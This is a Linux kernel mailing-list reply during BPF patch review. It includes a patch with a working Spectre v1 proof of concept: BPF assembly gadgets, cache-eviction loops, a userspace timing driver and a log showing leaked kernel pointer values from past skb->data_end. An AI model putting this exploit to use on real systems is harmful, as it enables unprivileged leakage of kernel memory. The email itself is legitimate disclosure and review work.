Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 8E03C7B1A46
	for <lists+linux-kselftest@lfdr.de>; Thu, 28 Sep 2023 13:15:18 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S232470AbjI1LPP (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Thu, 28 Sep 2023 07:15:15 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:39420 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S232002AbjI1LPE (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Thu, 28 Sep 2023 07:15:04 -0400
Received: from smtp-fw-33001.amazon.com (smtp-fw-33001.amazon.com [207.171.190.10])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 2FF98D01F;
        Thu, 28 Sep 2023 04:10:35 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=amazon.de; i=@amazon.de; q=dns/txt; s=amazon201209;
  t=1695899439; x=1727435439;
  h=from:to:cc:subject:date:message-id:in-reply-to:
   references:mime-version:reply-to:
   content-transfer-encoding;
  bh=jkgLmy+wIxdt6hjF6KrKlZxwrQjZofzj7OHWlzcQwqE=;
  b=DshLo4s/n+hA1F17mtmHkGyIwT1ZSv79bYIkDFpRL0hUN3kOe1F3gWTH
   IGft5sOo9B7A17c7GvD61FKYnR/IZ+QreURBxgztUYIHZ5NipBMbrVYOV
   esnoSTKBFQW3UaAdtx1vEmbOB5hO9QP22t/O+fClo+bBZJhfwmiDlplvo
   8=;
X-IronPort-AV: E=Sophos;i="6.03,183,1694736000"; 
   d="scan'208";a="306411251"
Received: from iad12-co-svc-p1-lb1-vlan3.amazon.com (HELO email-inbound-relay-pdx-2a-m6i4x-83883bdb.us-west-2.amazon.com) ([10.43.8.6])
  by smtp-border-fw-33001.sea14.amazon.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 28 Sep 2023 11:10:16 +0000
Received: from EX19D017EUA004.ant.amazon.com (pdx1-ws-svc-p6-lb9-vlan3.pdx.amazon.com [10.236.137.198])
        by email-inbound-relay-pdx-2a-m6i4x-83883bdb.us-west-2.amazon.com (Postfix) with ESMTPS id E88BE60A43;
        Thu, 28 Sep 2023 11:10:12 +0000 (UTC)
Received: from dev-dsk-gerhorst-1c-a6f23d20.eu-west-1.amazon.com
 (10.15.21.113) by EX19D017EUA004.ant.amazon.com (10.252.50.239) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1118.37; Thu, 28 Sep
 2023 11:10:04 +0000
From:   Luis Gerhorst <gerhorst@amazon.de>
To:     <alexei.starovoitov@gmail.com>
CC:     <andrii@kernel.org>, <ast@kernel.org>, <bpf@vger.kernel.org>,
        <daniel@iogearbox.net>, <gerhorst@cs.fau.de>, <hagarhem@amazon.de>,
        <haoluo@google.com>, <iii@linux.ibm.com>,
        <john.fastabend@gmail.com>, <jolsa@kernel.org>,
        <kpsingh@kernel.org>, <laoar.shao@gmail.com>,
        <linux-kernel@vger.kernel.org>, <linux-kselftest@vger.kernel.org>,
        <martin.lau@linux.dev>, <mykolal@fb.com>, <puranjay12@gmail.com>,
        <sdf@google.com>, <shuah@kernel.org>, <song@kernel.org>,
        <yonghong.song@linux.dev>, Luis Gerhorst <gerhorst@amazon.de>
Subject: Re: [PATCH 2/3] Revert "bpf: Fix issue in verifying allow_ptr_leaks"
Date:   Thu, 28 Sep 2023 11:09:27 +0000
Message-ID: <20230928110927.115238-1-gerhorst@amazon.de>
X-Mailer: git-send-email 2.40.1
In-Reply-To: <CAADnVQJZRqNZ_rKw2tUrmDpwhW7JGUge1+9x1_qtROf=OyMpHw@mail.gmail.com>
References: <CAADnVQJZRqNZ_rKw2tUrmDpwhW7JGUge1+9x1_qtROf=OyMpHw@mail.gmail.com>
MIME-Version: 1.0
Reply-To: Luis Gerhorst <gerhorst@cs.fau.de>
X-Originating-IP: [10.15.21.113]
X-ClientProxiedBy: EX19D042UWA001.ant.amazon.com (10.13.139.92) To
 EX19D017EUA004.ant.amazon.com (10.252.50.239)
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,
        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H5,RCVD_IN_MSPIKE_WL,
        SPF_HELO_NONE,SPF_NONE autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

On Tue, 19 Sep 2023 01:57:21 -0700 Alexei Starovoitov wrote:
> r9 is supposed to be available in the callee-saved register? :)
> I think you're missing that it is _callee_ saved.

I'm sorry I guess this was not clear enough, the idea was that this
register is not used by the callee, and therefore it also does not have
to be restored. Anyway, this does not appear to be important (I guess
because the return has to pull the stack into the cache anyway), see
below.

> If that bpf_loop indeed managed to flush L1 cache the
> refill of r9 in the epilogue would be a cache miss.
> And r7 will be a cache miss as well.
> So there is no chance cpu will execute 'if r2 <= r9' speculatively.
>
> I have to agree that the above approach sounds plausible in theory
> and I've never seen anyone propose to mispredict a branch
> this way. Which also means that no known speculation attack
> was crafted. I suspect that's a strong sign that
> the above approach is indeed a theory and it doesn't work in practice.
> Likely because the whole cache is flushed the subsequent misses
> will spoil all speculation. For spec v1 to work you need
> only one slow load in one side of that branch.
> The other load and the speculative code after should not miss.
> When it does the spec code won't be able to leave the breadcrumbs
> of the leaked bit in the cache.
> 'Leak full byte' is also 'wishful thinking' imo.
> I haven't seen any attack that leaks byte at-a-time.
>
> So I will insist on seeing a full working exploit before doing
> anything else here. It's good to discuss this cpu speculation
> concerns, but we have to stay practical.

I tried this and below you find a patch that leaks the otherwise
inaccessible skb_shinfo(skb)->frags[0].bv_page which lies 196 bytes
behind skb->data_end from userspace at 100B/h.

However, you are right in that there does not appear to be anything extremely
useful behind skb->data_end, destructor_arg is NULL in my setup but I
have also not found any code putting a static pointer there. Therefore
if it stays like this and we are sure the allocator introduces
sufficient randomness to make OOB reads useless, the original patches
can stay. If you decide to do this I will be happy to craft a patch that
documents that the respective structs should be considered 'public'
under Spectre v1 to make sure nobody puts anything sensitive there.

The exploit (if you consider leaking a struct page * and exploit) does
not leak more than one bit per mispredict (I did not try that) but
flushing data_end from the cache using bpf_loop() indeed appears to have
the desired effect (if you remove it, it doesn't work).

> One can find plenty of cases of 'read past skb->end'
> under speculation and I'm arguing none of them are exploitable.

I have not looked into those but I guess flushing the cache in between
the loads does not happen there.

Here's a shortened session log for using the patch below:

$ lsb_release -a
Description:    Debian GNU/Linux 11 (bullseye)
$ uname -a
Linux $HOST 5.10.0-25-cloud-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
$ lscpu
Socket(s):                          2
Model name:                         Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz
Virtualization:                     VT-x
Vulnerability Spectre v1:           Mitigation; usercopy/swapgs barriers and __user pointer sanitization
$ stress-ng --cache $(nproc) --cache-level 3 &
$ ./tools/testing/selftests/bpf/vmtest.sh -- time ./test_progs -t tc_bpf
<...>
[    0.297557] smpboot: CPU0: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz (family: 0x6, model: 0x4f, stepping: 0x1)
<...>
userspace guess for *(u64 *)(data+366 = data_end+196) = 0xffffdd2f04159400

You can already see that looks like a pointer. To also let the kernel print the
actual value remove the '#if 0' in cls_bpf_classify(). With that you can
check whether the middle bits are correct:

$ ./tools/testing/selftests/bpf/vmtest.sh -- time ./test_progs -t tc_bpf
<...>
[    2.399485] kernel skb_shinfo(skb)->frags[0].bv_page
[    2.399485]  *(ffff8a7541154670 ?= data+366 = ffff8a7541154670) = ffffe387c4155e00
<...>
userspace guess for *(u64 *)(data+366 = data_end+196) = 0xffffe387c4155e00

Misc: Please make sure you always reply-to/cc gerhorst@cs.fau.de as
gerhorst@amazon.de will become unmonitored shortly.

Signed-off-by: Luis Gerhorst <gerhorst@amazon.de>
Signed-off-by: Luis Gerhorst <gerhorst@cs.fau.de>
---
 net/sched/cls_bpf.c                           |  22 ++
 .../testing/selftests/bpf/prog_tests/tc_bpf.c | 334 +++++++++++++++++-
 .../testing/selftests/bpf/progs/test_tc_bpf.c |  78 +++-
 .../selftests/bpf/progs/test_tc_bpf_pkt_ptr.h | 172 +++++++++
 .../bpf/progs/test_tc_bpf_pkt_ptr_byte.h      |  31 ++
 5 files changed, 625 insertions(+), 12 deletions(-)
 mode change 100644 => 100755 tools/testing/selftests/bpf/prog_tests/tc_bpf.c
 mode change 100644 => 100755 tools/testing/selftests/bpf/progs/test_tc_bpf.c
 create mode 100644 tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr.h
 create mode 100644 tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr_byte.h

diff --git a/net/sched/cls_bpf.c b/net/sched/cls_bpf.c
index 382c7a71f81f..ef36ebca3b11 100644
--- a/net/sched/cls_bpf.c
+++ b/net/sched/cls_bpf.c
@@ -99,6 +99,28 @@ TC_INDIRECT_SCOPE int cls_bpf_classify(struct sk_buff *skb,
 			__skb_push(skb, skb->mac_len);
 			bpf_compute_data_pointers(skb);
 			filter_res = bpf_prog_run(prog->filter, skb);
+
+#if 0
+			// Print after program to not mess with the cache.
+			static atomic_t init = ATOMIC_INIT(0);
+			if (unlikely(skb_headlen(skb) == 170 && atomic_inc_return(&init) == 1)) {
+				barrier_nospec();
+				struct bpf_skb_data_end *cb = (struct bpf_skb_data_end *)skb->cb;
+				pr_err_ratelimited(
+					"skb = %px, skb_headlen(skb) = %d\n"
+					"data *(%px) = %px\n"
+					"data_end *(%px) = %px\n"
+					"kernel skb_shinfo(skb)->frags[0].bv_page\n\t*(%px ?= data+366 = %px) = %px\n",
+					skb, skb_headlen(skb),
+					&(skb->data), skb->data,
+					&(cb->data_end), cb->data_end,
+					&skb_shinfo(skb)->frags[0].bv_page,
+					((char *) skb->data) + 366,
+					skb_shinfo(skb)->frags[0].bv_page
+				);
+			}
+#endif
+
 			__skb_pull(skb, skb->mac_len);
 		} else {
 			bpf_compute_data_pointers(skb);
diff --git a/tools/testing/selftests/bpf/prog_tests/tc_bpf.c b/tools/testing/selftests/bpf/prog_tests/tc_bpf.c
old mode 100644
new mode 100755
index 48b55539331e..ec82e95895b5
--- a/tools/testing/selftests/bpf/prog_tests/tc_bpf.c
+++ b/tools/testing/selftests/bpf/prog_tests/tc_bpf.c
@@ -2,6 +2,8 @@
 
 #include <test_progs.h>
 #include <linux/pkt_cls.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
 
 #include "cap_helpers.h"
 #include "test_tc_bpf.skel.h"
@@ -395,6 +397,251 @@ void tc_bpf_root(void)
 	test_tc_bpf__destroy(skel);
 }
 
+static void die(char *s)
+{
+	perror(s);
+	exit(1);
+}
+
+#define SERVER "127.0.0.1"
+#define BUFLEN (128 * 1024)
+#define PORT 8888
+
+static int client(struct sockaddr_in *si_other) {
+	static int s = -1;
+	if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
+		die("socket");
+	}
+
+	memset((char *) si_other, 0, sizeof(si_other));
+	si_other->sin_family = AF_INET;
+	si_other->sin_port = htons(PORT);
+
+	if (inet_aton(SERVER , &si_other->sin_addr) == 0) {
+		fprintf(stderr, "inet_aton() failed\n");
+		exit(1);
+	}
+
+	return s;
+}
+
+static int server(void) {
+	struct sockaddr_in si_me;
+	int s;
+
+	if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
+		die("socket");
+	}
+
+	memset((char *) &si_me, 0, sizeof(si_me));
+
+	si_me.sin_family = AF_INET;
+	si_me.sin_port = htons(PORT);
+	si_me.sin_addr.s_addr = htonl(INADDR_ANY);
+
+	if (bind(s, (struct sockaddr *) &si_me, sizeof(si_me)) == -1) {
+		die("bind");
+	}
+
+	return s;
+}
+
+static int client_ping(int s, struct sockaddr_in *si_other, size_t n) {
+	unsigned int slen = sizeof(*si_other);
+	static char message[BUFLEN] = {};
+	memset(message, 0x37, n);
+
+	if (sendto(s, message, n, 0, (struct sockaddr *) si_other, slen) == -1) {
+		die("sendto()");
+	}
+
+	return 0;
+}
+
+#define CAT(a, b, d, c) a ## b ## d ## c
+#define NAME(S1, S2) CAT(pkt_ptr_, S1, _, S2)
+
+#define EI_MASK(BYTE, MASK)			\
+	else if (offset == BYTE && mask == MASK) fd = bpf_program__fd(skel->progs.NAME(BYTE, MASK));
+
+#define EI_BYTE(BYTE) \
+	EI_MASK(BYTE, 1) \
+	EI_MASK(BYTE, 2) \
+	EI_MASK(BYTE, 4) \
+	EI_MASK(BYTE, 8) \
+	EI_MASK(BYTE, 16) \
+	EI_MASK(BYTE, 32) \
+	EI_MASK(BYTE, 64) \
+	EI_MASK(BYTE, 128)
+
+static int exploit(struct test_tc_bpf *skel, long long *skipped, long long *total,
+				   long long *t0, long long *t1, int offset, int mask) {
+	DECLARE_LIBBPF_OPTS(bpf_tc_hook, hook, .ifindex = LO_IFINDEX, .attach_point = BPF_TC_INGRESS);
+
+	int fd;
+	if (offset == 350 && mask == 1) fd = bpf_program__fd(skel->progs.pkt_ptr_350_1);
+	EI_BYTE(366)
+	EI_BYTE(367)
+	EI_BYTE(368)
+	EI_BYTE(369)
+	EI_BYTE(370)
+	EI_BYTE(371)
+	EI_BYTE(372)
+	EI_BYTE(373)
+	else {
+		errno = EINVAL;
+		die("mask/offset");
+	}
+
+	DECLARE_LIBBPF_OPTS(bpf_tc_opts, opts, .prog_fd = fd);
+	int ret;
+
+	ret = bpf_tc_hook_create(&hook);
+	ret = ret == -EEXIST ? 0 : ret;
+	if (ret) {
+		errno = -ret;
+		perror("hook create");
+		if (!ASSERT_OK(ret, "bpf_tc_hook_create(BPF_TC_INGRESS)"))
+			goto destroy;
+	}
+
+	ret = bpf_tc_attach(&hook, &opts);
+	if (ret)
+		if (!ASSERT_OK(ret, "bpf_tc_attach"))
+			goto end;
+
+	int ss = server();
+	struct sockaddr_in si_server;
+	int cs = client(&si_server);
+
+	client_ping(cs, &si_server, 16*1024); // make it set bv_page != 0
+
+#define LEAKMAP_ENTRIES (5 * 512)
+
+	for (__u32 i = 0; i < LEAKMAP_ENTRIES; i += 512) {
+		__u32 key = i;
+		__s64 value = -i;
+		ret = bpf_map__update_elem(skel->maps.leakmap,
+								   &key, sizeof(key),
+								   &value, sizeof(value), 0);
+		if (ret) {
+			if (!ASSERT_OK(ret, "init_leak"))
+				goto end;
+		}
+	}
+
+// for 128KiB L1d, 90MiB L3, 1536-entry sltlb
+#define EVICTMAP_ENTRIES (8 * 128 * 1024)
+	for (__u32 i = 0; i < EVICTMAP_ENTRIES; i += 8) {
+		__u32 index = i / 8;
+		__u32 key = i + (index % 8);
+		__u64 value = i;
+		ret = bpf_map__update_elem(skel->maps.evictmap, &key, sizeof(key), &value, sizeof(value), 0);
+		if (ret) {
+			if (!ASSERT_OK(ret, "init_evict"))
+				goto end;
+		}
+	}
+
+	long long n = 0;
+#define T 8
+#define N 8
+	long long i;
+	for (i = 0; n < N; i++) {
+		// Branch prediction using PHT will be wrong unless it knows rand().
+		int t = rand() % T;
+		for (int j = 0; j < t; j++) {
+			client_ping(cs, &si_server, 512);
+		}
+		client_ping(cs, &si_server, 128); // + 42 byte header
+
+#define X 4
+		__s64 delta[X];
+		for (size_t j = 0; j < X; j++) {
+			__u32 key[X] = {0, 512, 1536, 1024};
+			ret = bpf_map__lookup_elem(skel->maps.leakmap, &key[j], sizeof(key[j]),
+									   &delta[j], sizeof(delta[j]), 0);
+			if (ret) {
+				if (!ASSERT_OK(ret, "delta lookup"))
+					goto end;
+			}
+			if (delta[j] <= 0) {
+				ASSERT_OK(-1, "delta not written by bpf program");
+			}
+		}
+
+		__u32 key = 2048;
+		__u64 err;
+		ret = bpf_map__lookup_elem(skel->maps.leakmap, &key, sizeof(key), &err, sizeof(err), 0);
+		if (ret) {
+			if (!ASSERT_OK(ret, "err lookup"))
+				goto end;
+		}
+		static bool first = true;
+		if (err && first) {
+			first = false;
+			ASSERT_OK(-err, "bpf");
+		}
+
+		if (i == 2 * 2 * N) {
+			// reload and retry
+			ret = -1;
+			// fprintf(stderr, "i: timeout after %lld reps\n", i);
+			break;
+		}
+
+		// sometimes everything is still in the cache
+		if (!((delta[3] < delta[2]))) {
+			// fprintf(stderr, "skip: uncached\t%lld, cached\t%lld, 0\t%lld, 1\t%lld\n", delta[2], delta[3], delta[0], delta[1]);
+			continue;
+		}
+
+		if (delta[0] > delta[1])
+			*t0 += 1000;
+		else
+			*t1 += 1000;
+		n++;
+	}
+
+	*skipped += i-n;
+	*total += i;
+
+	if (n > 0) {
+		*t0 /= n;
+		*t1 /= n;
+	}
+
+	__u32 key = 0;
+	__u64 value;
+	int ret2 = bpf_map__lookup_elem(skel->maps.evictmap,
+							   &key, sizeof(key),
+							   &value, sizeof(value), 0);
+	if (ret2) {
+		if (!ASSERT_OK(ret2, "lookup"))
+			goto end;
+	}
+	if (value > i*T) {
+		ASSERT_OK(-1, "BUG value > i*T");
+		goto end;
+	}
+
+end:
+	close(ss);
+	close(cs);
+
+	opts.prog_fd = opts.prog_id = 0;
+	ret2 = bpf_tc_detach(&hook, &opts);
+	if (ret2)
+		ASSERT_OK(ret2, "bpf_tc_detach");
+
+destroy:
+	ret2 = bpf_tc_hook_destroy(&hook);
+	if (ret2)
+		ASSERT_OK(ret2, "bpf_tc_hook_destroy");
+
+	return ret;
+}
+
 void tc_bpf_non_root(void)
 {
 	struct test_tc_bpf *skel = NULL;
@@ -409,11 +656,90 @@ void tc_bpf_non_root(void)
 	if (!ASSERT_OK(ret, "disable_cap_sys_admin"))
 		goto restore_cap;
 
-	skel = test_tc_bpf__open_and_load();
-	if (!ASSERT_OK_PTR(skel, "test_tc_bpf__open_and_load"))
-		goto restore_cap;
+	libbpf_set_print(NULL);
+
+#define O 1
+	for (int k = 0; k < O; k++) {// to test reproducibility
+
+		// Must match generated pkt_ptr programs in test_tc_bpf.c and exploit()
+		// function.
+		__u64 base_byte = 366;
+
+		long long skipped = 0;
+		long long total = 0;
+		long long bad_loads = 0;
+		long long total_loads = 0;
+		__u64 qw = 0;
+
+		for (__u64 byte = 0; byte < 8; byte++) {
+			for (__u64 bit = 0; bit < 8; bit++) {
+
+				long long dmax = INT_MIN;
+				long long dmin = INT_MAX;
+				long long d = 0;
+				long long m = 0;
+#define M 8
+				int j = 0;
+				for (j = 0; true; j++) {
+					total_loads += 1;
+					skel = test_tc_bpf__open_and_load();
+					if (skel) {
+						long long t0 = 0, t1 = 0;
+
+						ret = exploit(skel,
+									  &skipped, &total,
+									  &t0, &t1,
+									  base_byte + byte, 1 << bit);
+						if (ret == -1) {
+							bad_loads += 1;
+							goto cleanup;
+						}
+						if (ret)
+							if (!ASSERT_OK(ret, "exploit"))
+								goto restore_cap;
+
+						if (j == 0) {
+							goto cleanup;
+						}
+
+						long long jd = t0 - t1;
+						dmax = jd > dmax ? jd : dmax;
+						dmin = jd < dmin ? jd : dmin;
+						d += jd;
+						m++;
+					}
+				cleanup:
+					test_tc_bpf__destroy(skel);
+
+					if (j == 64 * M) {
+						fprintf(stderr, "failed to read bit accurately because of too many consecutive bad loads or inconclusive result, will continue anyway");
+						break;
+					}
+
+					// Continue as long as result is inconclusive.
+					if (m >= M && (d / m >= 200 || d / m <= -200)) {
+						break;
+					}
+				}
+
+				d /= m;
+
+				fprintf(stderr, "*(data+%lld):%lld = %lld < avg %lld < %lld (ps), j = %d\n", base_byte + byte, bit, dmin, d, dmax, j);
+
+				// little endian
+				__u64 b = !!(d < 0 ? 0 : 1);
+				qw |= b << ((byte * 8) + bit);
+			}
+		}
+		fprintf(stderr, "userspace guess for *(u64 *)(data+%lld = data_end+%lld) = 0x%llx\n"
+				"\t>%lld percent bad samples; %lld percent bad loads\n",
+				base_byte, base_byte - 42 - 128, qw,
+				(skipped * 100) / total,
+				(bad_loads * 100) / total_loads);
 
-	test_tc_bpf__destroy(skel);
+	}
+
+	ASSERT_OK(-1, "exploit");
 
 restore_cap:
 	if (caps)
diff --git a/tools/testing/selftests/bpf/progs/test_tc_bpf.c b/tools/testing/selftests/bpf/progs/test_tc_bpf.c
old mode 100644
new mode 100755
index ef7da419632a..c5344255ce88
--- a/tools/testing/selftests/bpf/progs/test_tc_bpf.c
+++ b/tools/testing/selftests/bpf/progs/test_tc_bpf.c
@@ -4,6 +4,7 @@
 #include <bpf/bpf_helpers.h>
 #include <linux/if_ether.h>
 #include <linux/ip.h>
+#include "bpf_misc.h"
 
 /* Dummy prog to test TC-BPF API */
 
@@ -13,13 +14,74 @@ int cls(struct __sk_buff *skb)
 	return 0;
 }
 
-/* Prog to verify tc-bpf without cap_sys_admin and cap_perfmon */
-SEC("tcx/ingress")
-int pkt_ptr(struct __sk_buff *skb)
-{
-	struct iphdr *iph = (void *)(long)skb->data + sizeof(struct ethhdr);
+/* pkt-ptr-based Spectre v1 gadget */
 
-	if ((long)(iph + 1) > (long)skb->data_end)
-		return 1;
-	return 0;
+#define LEAKMAP_ENTRIES (5 * 512)
+
+struct {
+	__uint(type, BPF_MAP_TYPE_ARRAY);
+	__uint(max_entries, LEAKMAP_ENTRIES);
+	__type(key, __u32);
+	__type(value, __u64);
+} leakmap SEC(".maps");
+
+#define L1_SIZE_KiB 128
+#define SIZEOF_CACHELINE 64
+#define EVICTMAP_ENTRIES (8 * 128 * 1024)
+
+struct {
+	__uint(type, BPF_MAP_TYPE_ARRAY);
+	__uint(max_entries, EVICTMAP_ENTRIES);
+	__type(key, __u32);
+	__type(value, __u64);
+} evictmap SEC(".maps");
+
+static long callback_fn(__u32 index, void *ctx) {
+// sizeof(u64) * 8 is one 64-byte cacheline
+	__u32 key = index * 8 + (index % 8);
+	__u64 *value = bpf_map_lookup_elem(&evictmap, &key);
+	if (value) {
+		*value += 1;
+		return 0;
+	}
+	return 1;
 }
+
+#define STRINGIFY(x) #x
+#define TOSTRING(x) STRINGIFY(x)
+#define CAT(a, b, d, c) a ## b ## d ## c
+#define NAME(S1, S2) CAT(pkt_ptr_, S1, _, S2)
+
+#define OFFSET 350
+#define MASK 1
+#include "test_tc_bpf_pkt_ptr.h"
+#undef OFFSET
+#undef MASK
+
+// 366 = PAYLOAD + 42 + 196 with PAYLOAD=128
+#define OFFSET 366
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 367
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 368
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 369
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 370
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 371
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 372
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+#define OFFSET 373
+#include "test_tc_bpf_pkt_ptr_byte.h"
+#undef OFFSET
+
+char LICENSE[] SEC("license") = "GPL";
diff --git a/tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr.h b/tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr.h
new file mode 100644
index 000000000000..2cd6ab000e4d
--- /dev/null
+++ b/tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr.h
@@ -0,0 +1,172 @@
+#include <linux/bpf.h>
+#include <bpf/bpf_helpers.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include "bpf_misc.h"
+
+/*
+cd /root/bpf && ./ltb/sbin/bpftool prog loadall ./test_tc_bpf.bpf.o /sys/fs/bpf/tc && ./ltb/sbin/bpftool prog dump jited pinned /sys/fs/bpf/tc/pkt_ptr
+
+*/
+
+#undef SHIFT
+#if MASK == 1
+#define SHIFT 9
+#endif
+#if MASK == 2
+#define SHIFT 8
+#endif
+#if MASK == 4
+#define SHIFT 7
+#endif
+#if MASK == 8
+#define SHIFT 6
+#endif
+#if MASK == 16
+#define SHIFT 5
+#endif
+#if MASK == 32
+#define SHIFT 4
+#endif
+#if MASK == 64
+#define SHIFT 3
+#endif
+#if MASK == 128
+#define SHIFT 2
+#endif
+
+SEC("tcx/ingress")
+__naked
+void NAME(OFFSET, MASK)(void)
+{
+	// +76: data
+	// +80: data_end
+	asm volatile (
+		"r7 = r1;"
+
+		// Prepare data in callee-saved register that is not used by bpf_loop
+		// and callback_fn (and therefore not saved/restored).
+		"r9 = *(u32 *)(r7 + 76);"
+		"r8 = r9;"
+		// Construct bad ptr
+		"r9 += " TOSTRING(OFFSET) ";"
+
+		// Prepare warm up gadget
+		"r8 += 166;" // 128 payload + 42 header - 4
+		"r0 = *(u32 *)(r7 + 80);" // data_end
+		"if r0 <= r8 goto err_%=;"
+
+		// Iterate over 8MiB to evict data_end cacheline from 1536-entry STLB
+		// and core's 2.5MiB L3.
+		"r1 = 1024;" // *= 8 in callback
+		"r1 *= 128;"
+		"r2 = %[callback_fn] ll;"
+		"r3 = 0;"
+        "*(u64 *)(r10 - 8) = r3;"
+        "r3 = r10;"
+        "r3 += -8;"
+		"r4 = 0;"
+		"call %[bpf_loop];"
+
+		// Warm secret TLB, improves accuracy
+		"r5 = *(u8 *)(r8 + 0);"
+
+		"r8 = r9;"
+		// Wait for TLB to resolve page by storing to unitialized stack slot which will insert an lfence.
+		"*(u64 *)(r10 - 16) = r5;"
+
+		// Check bpf_loop err
+		"if r0 == 0 goto err_%=;"
+
+		// Prepare bpf_map_lookup_elem() args
+		"r1 = %[leakmap] ll;"
+		"r2 = r10;"
+		"r2 += -8;"
+		// Gadget
+		"r3 = *(u32 *)(r7 + 80);" // slow data_end load
+		"if r3 <= r8 goto check0_%=;" // mispredicted branch
+		// "r5 = 0x84;" // for testing gadget without load
+		"r5 = *(u8 *)(r9 + 0);" // fast secret load
+		"r5 &= " TOSTRING(MASK) ";"
+		"r5 <<= " TOSTRING(SHIFT) ";"
+		"*(u64*)(r10 - 8) = r5;"
+		"call %[bpf_map_lookup_elem];"
+		"if r0 == 0 goto err_%=;"
+		"r0 = *(u64 *)(r0 + 0);" // leak secret into leakmap[0|512].is_cached
+
+		// Adds lfence, to make sure we don't speculate into the check code
+		"*(u64 *)(r10 - 24) = r0;"
+
+		"check0_%=:"
+
+#undef TIME_R7
+#define TIME_R7()								\
+		"*(u64*)(r10 - 8) = r7;"				\
+		"call %[bpf_ktime_get_ns];"				\
+		"r6 = r0;"								\
+		"r1 = %[leakmap] ll;"					\
+		"r2 = r10;"								\
+		"r2 += -8;"								\
+		"call %[bpf_map_lookup_elem];"			\
+		"if r0 == 0 goto err_%=;"				\
+		"r1 = *(u64 *)(r0 + 0);"				\
+		"r7 = r0;"								\
+		"call %[bpf_ktime_get_ns];"				\
+		"r0 -= r6;"								\
+		"*(u64 *)(r7 + 0) = r0;"
+
+        // warm instruction caches
+		"r7 = 1024;"
+		TIME_R7()
+
+		// uncached access for comp.
+		"r7 = 1536;"
+		TIME_R7()
+
+		// test 0 delay
+		"r7 = 0;"
+		TIME_R7()
+
+		// test 1 delay
+		"r7 = 512;"
+		TIME_R7()
+
+		// cached access for comp.
+		"r7 = 1024;"
+		TIME_R7()
+
+		// set err=0
+		"r1 = %[leakmap] ll;"
+		"r2 = 2048;"
+		"*(u64*)(r10 - 8) = r2;"
+		"r2 = r10;"
+		"r2 += -8;"
+		"call %[bpf_map_lookup_elem];"
+		"if r0 == 0 goto err_%=;"
+        "r1 = 0;" // err
+		"*(u64 *)(r0 + 0) = r1;"
+
+		"goto exit_%=;"
+
+		"err_%=:"
+		"r1 = %[leakmap] ll;"
+		"r2 = 2048;"
+		"*(u64*)(r10 - 8) = r2;"
+		"r2 = r10;"
+		"r2 += -8;"
+		"call %[bpf_map_lookup_elem];"
+		"if r0 == 0 goto exit_%=;"
+        "r1 = 2;" // err = other
+		"*(u64 *)(r0 + 0) = r1;"
+
+		"exit_%=:"
+		"r0 = 2;" // TC_ACT_SHOT, drop packet
+		"exit;"
+		:
+		: __imm_addr(leakmap),
+		  __imm_addr(callback_fn),
+		  __imm(bpf_loop),
+		  __imm(bpf_ktime_get_ns),
+		  __imm(bpf_map_lookup_elem)
+		: __clobber_all);
+}
diff --git a/tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr_byte.h b/tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr_byte.h
new file mode 100644
index 000000000000..b73ee23a59ec
--- /dev/null
+++ b/tools/testing/selftests/bpf/progs/test_tc_bpf_pkt_ptr_byte.h
@@ -0,0 +1,31 @@
+#define MASK 1
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 2
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 4
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 8
+#include "test_tc_bpf_pkt_ptr.h"
+#undef MASK
+
+#define MASK 16
